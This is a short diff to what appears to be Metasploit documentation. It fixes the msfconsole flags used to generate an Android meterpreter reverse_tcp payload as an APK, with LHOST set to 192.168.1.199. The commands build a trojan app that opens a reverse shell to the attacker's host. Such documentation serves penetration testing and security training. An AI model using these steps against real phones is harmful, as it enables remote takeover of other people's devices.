@@ -37,7 +37,7 @@ To create the APK with `msfconsole`:
 msf > use payload/android/meterpreter/reverse_tcp 
 msf payload(reverse_tcp) > set LHOST 192.168.1.199
 LHOST => 192.168.1.199
-msf payload(reverse_tcp) > generate -t raw -f /tmp/android.apk
+msf payload(reverse_tcp) > generate -f raw -o /tmp/android.apk
 [*] Writing 8992 bytes to /tmp/android.apk...
 msf payload(reverse_tcp) >
 ```
